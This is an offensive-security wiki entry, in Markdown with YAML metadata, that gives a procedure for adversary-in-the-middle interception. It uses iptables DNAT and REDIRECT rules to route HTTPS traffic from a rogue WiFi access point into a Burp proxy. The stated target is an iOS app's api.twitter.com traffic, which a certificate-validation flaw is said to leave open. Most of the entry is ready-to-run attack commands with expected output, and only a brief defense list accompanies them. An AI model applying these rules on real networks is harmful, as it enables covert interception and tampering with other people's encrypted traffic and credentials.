---
id: proc-iptables-https-redirect-001
tags:
  - iptables
  - nat
  - redirect
  - mitm
type: procedure
tools:
  - '[[tools/iptables]]'
tactics:
  - '[[Defense Evasion]]'
commands:
  - '[[commands/iptables-dnat-https-to-proxy]]'
  - '[[commands/iptables-redirect-https-to-port]]'
verified: false
platforms:
  - Linux
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Adversary-in-the-Middle]]'
updated_at: '2025-12-14T17:24:44.836Z'
skill_level: intermediate
impact_level: high
detection_risk: low
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Defense Evasion]]'
mitre_techniques:
  - '[[Adversary-in-the-Middle]]'
---
# Redirect-HTTPS-Traffic-Using-iptables

## Summary

This procedure uses iptables to transparently redirect incoming HTTPS traffic (port 443) from the rogue WiFi interface to a local proxy port, enabling MITM without altering client behavior.

## Description

On the Linux attacker machine, NAT rules in the PREROUTING chain DNAT and REDIRECT traffic from wlan0 to the Burp proxy at 8080. This targets connections to api.twitter.com from the iOS app. No client changes needed due to certificate validation flaw. Outcomes: All HTTPS flows through proxy for inspection/modification.

## Requirements

1. Root access on Linux
2. wlan0 interface active as AP
3. Proxy listening on 8080

## Defense

Defensive measures and detection strategies:

- Firewall rules to block unauthorized NAT/redirection
- Monitor iptables logs for unusual PREROUTING rules
- App-level HSTS enforcement to detect downgrades

## Objectives

1. Intercept port 443 traffic
2. Route to transparent proxy
3. Maintain transparent operation

## Instructions

### Step 1: Apply DNAT Rule

**Context**: Destination NAT to forward traffic to proxy IP.

**Command** ([[commands/iptables-dnat-https-to-proxy]]):
```bash
iptables -t nat -A PREROUTING -i wlan0 -p tcp --dport 443 -j DNAT --to $BURP_IP:8080
```

> Matches TCP on wlan0 port 443, redirects to Burp IP:8080. Expected: No output; verify with `iptables -t nat -L`.

### Step 2: Apply REDIRECT Rule

**Context**: Local redirect for completeness in handling.

**Command** ([[commands/iptables-redirect-https-to-port]]):
```bash
iptables -t nat -A PREROUTING -i wlan0 -p tcp --dport 443 -j REDIRECT --to-port 8080
```

> Redirects to local port 8080. Expected: No output; traffic now proxies.

### Step 3: Verify Rules

**Context**: Check applied rules.

```bash
iptables -t nat -L -v -n
```

> Lists rules; counters increment on traffic.

## MITRE ATT&CK Mapping

### Tactics

- [[Defense Evasion]] Defense Evasion

### Techniques

- [[Adversary-in-the-Middle]] Adversary-in-the-Middle

### Sub-Techniques


## Commands Used

- [[commands/iptables-dnat-https-to-proxy]]
- [[commands/iptables-redirect-https-to-port]]

## Tools Used

- [[tools/iptables]]

## Tags

- iptables
- nat
